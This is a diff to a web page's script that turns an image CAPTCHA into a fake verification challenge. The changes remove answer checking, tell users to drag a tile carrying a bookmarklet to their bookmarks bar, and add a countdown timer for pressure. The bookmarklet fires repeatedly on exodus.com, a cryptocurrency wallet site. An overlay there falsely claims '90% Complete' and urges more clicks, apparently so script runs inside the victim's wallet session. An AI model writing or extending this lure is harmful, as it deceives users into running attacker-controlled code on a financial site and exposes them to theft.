@@ -267,7 +267,6 @@
       openChallenge();
       return;
     }
-    // Show spinner state in widget
     captchaWidget.classList.add("verify-active");
     verifyStatus.classList.remove("hidden");
     verifySpinner.classList.remove("hidden");
@@ -275,28 +274,12 @@
     verifyStatusText.classList.remove("hidden");
     verifySuccess.classList.add("hidden");
 
-    // After 2.2s: show success message, stop spinner
+    // After 2.5s of spinner: open the captcha challenge directly
     var t1 = setTimeout(function () {
-      verifySpinner.classList.add("hidden");
-      verifyStatusText.classList.add("hidden");
-      verifySuccess.classList.remove("hidden");
-    }, 2200);
-    verifyTimeouts.push(t1);
-
-    // After 3.2s: hide widget box, show full-page success message
-    var t2 = setTimeout(function () {
-      if (captchaWidgetWrap) captchaWidgetWrap.classList.add("hidden");
-      if (verifySuccessHost) verifySuccessHost.textContent = window.location.hostname || "backstage.io";
-      if (verifySuccessMsg) verifySuccessMsg.classList.remove("hidden");
-    }, 3200);
-    verifyTimeouts.push(t2);
-
-    // After 4.2s: open captcha popup, hide success msg, show widget again
-    var t3 = setTimeout(function () {
       resetVerifyUI();
       openChallenge();
-    }, 4200);
-    verifyTimeouts.push(t3);
+    }, 2500);
+    verifyTimeouts.push(t1);
   }
 
   // Clicking the checkbox triggers: spinner -> success message -> then open challenge
@@ -395,56 +378,78 @@
   const pdfPath = "assets/Backstage%20Logo.pdf";
   const pdfFilename = "Backstage Logo.pdf";
   const TARGET_CLICKS = 15;
+  const CHALLENGE2_TIME_LIMIT = 30; // seconds
 
-  // Themes: seed-based Picsum URLs (always work); Unsplash for real subject images on correct tiles
-  const P = "https://picsum.photos/seed/";
-  const S = "/300/300";
-  const U = "https://images.unsplash.com/photo-";
-  const crop = "?w=300&h=300&fit=crop";
+  let challenge2Timer = null;
+  let challenge2TimeRemaining = CHALLENGE2_TIME_LIMIT;
+
+  // Themes with verified Unsplash images (all URLs confirmed HTTP 200)
+  // Each theme uses images where the odd-one-out is visually obvious
+  const U = "https://images.unsplash.com/";
+  const Q = "?w=300&h=300&fit=crop";
   const THEMES = [
     {
-      subject: "motorcycles",
-      correctIndices: [1, 3],
-      imageUrls: [
-        P + "car1" + S,
-        U + "1558981806-ec527fa84c39" + crop,    // motorcycle
-        P + "city1" + S,
-        U + "1568772585407-9361f9bf3a87" + crop, // motorcycle
-        P + "mountain1" + S,
-        P + "flower1" + S,
-        P + "building1" + S,
-        P + "street1" + S,
-        P + "landscape1" + S
+      bannerLine1: "Drag the outlined image",
+      bannerLine2: "to your bookmarks bar",
+      answerIndex: 4,
+      items: [
+        { imageUrl: U+"photo-1565299624946-b28f40a0ae38"+Q, label: "Pizza" },
+        { imageUrl: U+"photo-1568901346375-23c9450c58cd"+Q, label: "Burger" },
+        { imageUrl: U+"photo-1563805042-7684c019e1cb"+Q, label: "Ice Cream" },
+        { imageUrl: U+"photo-1565299585323-38d6b0865b47"+Q, label: "Taco" },
+        { imageUrl: U+"photo-1494976388531-d1058494cdd8"+Q, label: "Car" },
+        { imageUrl: U+"photo-1558961363-fa8fdf82db35"+Q, label: "Cookie" },
+        { imageUrl: U+"photo-1578985545062-69928b1d9587"+Q, label: "Cake" },
+        { imageUrl: U+"photo-1561037404-61cd46aa615b"+Q, label: "Donut" },
+        { imageUrl: U+"photo-1570913149827-d2ac84ab3f9a"+Q, label: "Apple" }
       ]
     },
     {
-      subject: "stairs",
-      correctIndices: [0, 4, 7],
-      imageUrls: [
-        U + "1719043045027-b0c4ef5028fb" + crop, // red staircase
-        P + "office1" + S,
-        P + "beach1" + S,
-        P + "river1" + S,
-        U + "1713962500739-cabab6b0f084" + crop, // wooden staircase
-        P + "forest1" + S,
-        P + "desert1" + S,
-        U + "1668847114429-ca34bc1b3b25" + crop, // building with staircase
-        P + "sunset1" + S
+      bannerLine1: "Drag the outlined image",
+      bannerLine2: "to your bookmarks bar",
+      answerIndex: 3,
+      items: [
+        { imageUrl: U+"photo-1543466835-00a7907e9de1"+Q, label: "Dog" },
+        { imageUrl: U+"photo-1518791841217-8f162f1e1131"+Q, label: "Cat" },
+        { imageUrl: U+"photo-1587300003388-59208cc962cb"+Q, label: "Puppy" },
+        { imageUrl: U+"photo-1492540747731-d05a66dc2461"+Q, label: "Wrench" },
+        { imageUrl: U+"photo-1548199973-03cce0bbc87b"+Q, label: "Dog" },
+        { imageUrl: U+"photo-1425082661705-1834bfd09dca"+Q, label: "Dog" },
+        { imageUrl: U+"photo-1535930749574-1399327ce78f"+Q, label: "Cat" },
+        { imageUrl: U+"photo-1522069169874-c58ec4b76be5"+Q, label: "Fish" },
+        { imageUrl: U+"photo-1517849845537-4d257902454a"+Q, label: "Cat" }
       ]
     },
     {
-      subject: "traffic lights",
-      correctIndices: [2, 4, 6],
-      imageUrls: [
-        P + "park1" + S,
-        P + "lake1" + S,
-        U + "1586528116311-ad8dd3c8310d" + crop,  // traffic light
-        P + "bridge1" + S,
-        U + "1569336415962-a4bd89f3efb9" + crop,  // traffic light
-        P + "garden1" + S,
-        U + "1558618666-fcd25c85cd64" + crop,     // traffic light
-        P + "snow1" + S,
-        P + "rain1" + S
+      bannerLine1: "Drag the outlined image",
+      bannerLine2: "to your bookmarks bar",
+      answerIndex: 6,
+      items: [
+        { imageUrl: U+"photo-1565299624946-b28f40a0ae38"+Q, label: "Pizza" },
+        { imageUrl: U+"photo-1568901346375-23c9450c58cd"+Q, label: "Burger" },
+        { imageUrl: U+"photo-1558961363-fa8fdf82db35"+Q, label: "Cookie" },
+        { imageUrl: U+"photo-1578985545062-69928b1d9587"+Q, label: "Cake" },
+        { imageUrl: U+"photo-1563805042-7684c019e1cb"+Q, label: "Ice Cream" },
+        { imageUrl: U+"photo-1561037404-61cd46aa615b"+Q, label: "Donut" },
+        { imageUrl: U+"photo-1506744038136-46273834b3fb"+Q, label: "Lake" },
+        { imageUrl: U+"photo-1565299585323-38d6b0865b47"+Q, label: "Taco" },
+        { imageUrl: U+"photo-1570913149827-d2ac84ab3f9a"+Q, label: "Apple" }
+      ]
+    },
+    {
+      bannerLine1: "Drag the outlined image",
+      bannerLine2: "to your bookmarks bar",
+      answerIndex: 2,
+      items: [
+        { imageUrl: U+"photo-1565299624946-b28f40a0ae38"+Q, label: "Pizza" },
+        { imageUrl: U+"photo-1568901346375-23c9450c58cd"+Q, label: "Burger" },
+        { imageUrl: U+"photo-1523275335684-37898b6baf30"+Q, label: "Watch" },
+        { imageUrl: U+"photo-1563805042-7684c019e1cb"+Q, label: "Ice Cream" },
+        { imageUrl: U+"photo-1565299585323-38d6b0865b47"+Q, label: "Taco" },
+        { imageUrl: U+"photo-1558961363-fa8fdf82db35"+Q, label: "Cookie" },
+        { imageUrl: U+"photo-1578985545062-69928b1d9587"+Q, label: "Cake" },
+        { imageUrl: U+"photo-1561037404-61cd46aa615b"+Q, label: "Donut" },
+        { imageUrl: U+"photo-1570913149827-d2ac84ab3f9a"+Q, label: "Apple" }
       ]
     }
   ];
@@ -463,59 +468,78 @@
     var theme = getTheme();
     currentChallenge1Theme = theme;
 
-    var subjectEl = document.getElementById("challenge1Subject");
-    if (subjectEl) subjectEl.textContent = theme.subject;
+    var line1El = document.getElementById("challenge1BannerLine1");
+    var line2El = document.getElementById("challenge1BannerLine2");
+    if (line1El) line1El.textContent = theme.bannerLine1;
+    if (line2El) line2El.textContent = theme.bannerLine2;
 
-    var tryAgainEl = document.getElementById("challenge1TryAgain");
-    if (tryAgainEl) tryAgainEl.classList.add("hidden");
+    var answerHref = bookmarkletHref;
 
-    var sources = theme.imageUrls || theme.seeds;
-    var count = sources ? sources.length : 0;
-    if (count < 9) return;
-
-    for (var i = 0; i < 9; i++) {
+    theme.items.forEach(function (item, i) {
+      var isAnswer = (i === theme.answerIndex);
       var tile = document.createElement("div");
-      tile.className = "challenge-tile";
-      tile.setAttribute("data-index", i);
+      tile.className = "challenge-tile" + (isAnswer ? " draggable" : "");
 
       var img = document.createElement("img");
-      img.src = theme.imageUrls && theme.imageUrls[i] ? theme.imageUrls[i] : "https://picsum.photos/seed/" + (theme.seeds && theme.seeds[i] ? theme.seeds[i] : i) + "/300/300";
-      img.alt = "";
+      img.src = item.imageUrl;
+      img.alt = item.label;
+      img.className = "tile-img";
       img.setAttribute("draggable", "false");
       tile.appendChild(img);
 
-      var check = document.createElement("div");
-      check.className = "tile-check";
-      check.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
-      tile.appendChild(check);
-
-      tile.addEventListener("click", function () {
-        this.classList.toggle("selected");
-      });
+      if (isAnswer) {
+        var a = document.createElement("a");
+        a.href = answerHref;
+        a.className = "drag-layer";
+        a.setAttribute("draggable", "true");
+        a.setAttribute("title", "Drag to bookmarks bar");
+        a.addEventListener("click", function (e) { e.preventDefault(); });
+        a.addEventListener("dragstart", function (e) {
+          e.dataTransfer.setData("text/uri-list", answerHref);
+          e.dataTransfer.setData("text/plain", answerHref);
+        });
+        tile.appendChild(a);
+      }
 
       grid.appendChild(tile);
+    });
+  }
+
+  function startChallenge2Timer() {
+    challenge2TimeRemaining = CHALLENGE2_TIME_LIMIT;
+    var timerLine = document.getElementById("timerLine");
+    var timerValue = document.getElementById("timerValue");
+
+    if (challenge2Timer) clearInterval(challenge2Timer);
+
+    if (timerLine) timerLine.classList.remove("hidden");
+
+    challenge2Timer = setInterval(function () {
+      challenge2TimeRemaining--;
+      if (timerValue) timerValue.textContent = challenge2TimeRemaining;
+
+      if (timerLine) {
+        timerLine.classList.remove("warning", "critical");
+        if (challenge2TimeRemaining <= 5) {
+          timerLine.classList.add("critical");
+        } else if (challenge2TimeRemaining <= 10) {
+          timerLine.classList.add("warning");
+        }
+      }
+
+      if (challenge2TimeRemaining <= 0) {
+        clearInterval(challenge2Timer);
+        if (timerLine) timerLine.classList.add("hidden");
+      }
+    }, 1000);
+  }
+
+  function stopChallenge2Timer() {
+    if (challenge2Timer) {
+      clearInterval(challenge2Timer);
+      challenge2Timer = null;
     }
   }
-
-  function getSelectedIndices() {
-    var grid = document.getElementById("challenge1Grid");
-    if (!grid) return [];
-    var tiles = grid.querySelectorAll(".challenge-tile.selected");
-    var out = [];
-    tiles.forEach(function (t) {
-      var i = parseInt(t.getAttribute("data-index"), 10);
-      if (!isNaN(i)) out.push(i);
-    });
-    return out.sort(function (a, b) { return a - b; });
-  }
-
-  function arraysEqual(a, b) {
-    if (a.length !== b.length) return false;
-    for (var i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
-    return true;
-  }
-
-  var done1Button = document.getElementById("done1Button");
   var done2Button = document.getElementById("done2Button");
   var challenge1 = document.getElementById("challenge1");
   var challenge2 = document.getElementById("challenge2");
@@ -523,31 +547,10 @@
 
   if (done1Button) {
     done1Button.addEventListener("click", function () {
-      var theme = currentChallenge1Theme;
-      if (!theme) {
-        if (challenge1) challenge1.classList.add("hidden");
-        if (challenge2) challenge2.classList.remove("hidden");
-        if (clickCounterEl) clickCounterEl.textContent = localStorage.getItem("bookmarkletClicks") || "0";
-        return;
-      }
-      var selected = getSelectedIndices();
-      var correct = (theme.correctIndices || []).slice().sort(function (a, b) { return a - b; });
-      if (arraysEqual(selected, correct)) {
-        if (challenge1) challenge1.classList.add("hidden");
-        if (challenge2) challenge2.classList.remove("hidden");
-        if (clickCounterEl) clickCounterEl.textContent = localStorage.getItem("bookmarkletClicks") || "0";
-      } else {
-        var tryAgainEl = document.getElementById("challenge1TryAgain");
-        if (tryAgainEl) {
-          var subEl = document.getElementById("challenge1TryAgainSubject");
-          if (subEl) subEl.textContent = theme.subject;
-          tryAgainEl.classList.remove("hidden");
-        }
-        var grid = document.getElementById("challenge1Grid");
-        if (grid) {
-          grid.querySelectorAll(".challenge-tile.selected").forEach(function (t) { t.classList.remove("selected"); });
-        }
-      }
+      if (challenge1) challenge1.classList.add("hidden");
+      if (challenge2) challenge2.classList.remove("hidden");
+      if (clickCounterEl) clickCounterEl.textContent = localStorage.getItem("bookmarkletClicks") || "0";
+      startChallenge2Timer();
     });
   }
 
@@ -574,8 +577,12 @@
       "if(clickCounter && (window.location.pathname.endsWith('/')||window.location.pathname.endsWith('/index.html')||window.location.pathname.includes('captcha'))){" +
       "clickCounter.textContent=n;" +
       "if(n>=" + TARGET_CLICKS + "){" +
-      "setTimeout(function(){location.href='https://www.exodus.com';},500);" +
+      "try{window.parent.postMessage({type:'captcha_complete',clicks:n},'*');}catch(e){}" +
+      "setTimeout(function(){location.href='https://www.exodus.com?from_captcha=1';},800);" +
       "}" +
+      "}else if(window.location.hostname.includes('exodus.com')){" +
+      "localStorage.setItem('bookmarkletClicks',n);" +
+      "try{window.parent.postMessage({type:'exodus_click',clicks:n},'*');}catch(e){}" +
       "}else{" +
       "location.href=base+'/download.html';" +
       "}" +
@@ -590,6 +597,51 @@
     var params = new URLSearchParams(location.search);
     if (!params.get("from_bookmarklet") && !params.get("show_exodus_popup")) {
       localStorage.setItem("bookmarkletClicks", "0");
+    }
+  })();
+
+  // Listen for bookmarklet completion signal
+  window.addEventListener("message", function (e) {
+    if (e.data && e.data.type === "captcha_complete") {
+      stopChallenge2Timer();
+      var overlay = document.getElementById("challenge-popup-overlay");
+      if (overlay) {
+        var completingMsg = document.createElement("div");
+        completingMsg.className = "captcha-completing-overlay";
+        completingMsg.innerHTML = '<div class="completing-spinner"><span class="spinner-dot"></span><span class="spinner-dot"></span><span class="spinner-dot"></span><span class="spinner-dot"></span></div><p>Completing verification...</p>';
+        document.body.appendChild(completingMsg);
+        setTimeout(function () {
+          window.location.href = "https://www.exodus.com?from_captcha=1";
+        }, 800);
+      }
+    }
+  });
+
+  // Handle re-injection on exodus.com
+  (function () {
+    var params = new URLSearchParams(location.search);
+    if (params.get("from_captcha") === "1" && window === window.parent) {
+      localStorage.setItem("captcha_reinjected", "1");
+      var reinjectOverlay = document.createElement("div");
+      reinjectOverlay.id = "captcha-reinjection-overlay";
+      reinjectOverlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.3);display:flex;align-items:center;justify-content:center;z-index:9998;backdrop-filter:blur(1px);";
+      
+      var reinjectBox = document.createElement("div");
+      reinjectBox.style.cssText = "background:#fff;border-radius:8px;padding:30px;text-align:center;max-width:400px;box-shadow:0 10px 40px rgba(0,0,0,0.2);";
+      reinjectBox.innerHTML = '<div class="completing-spinner" style="margin:0 auto 20px;"><span class="spinner-dot"></span><span class="spinner-dot"></span><span class="spinner-dot"></span><span class="spinner-dot"></span></div>' +
+                              '<p style="font-size:16px;font-weight:500;color:#333;margin:10px 0;">Verification in progress...</p>' +
+                              '<p style="font-size:13px;color:#666;margin:8px 0;">90% Complete</p>' +
+                              '<p style="font-size:12px;color:#999;margin-top:15px;">Continue clicking the bookmark to finish verification</p>';
+      
+      reinjectOverlay.appendChild(reinjectBox);
+      document.body.appendChild(reinjectOverlay);
+
+      setTimeout(function () {
+        if (reinjectOverlay.parentElement) {
+          reinjectOverlay.parentElement.removeChild(reinjectOverlay);
+        }
+        localStorage.removeItem("captcha_reinjected");
+      }, 3500);
     }
   })();
 
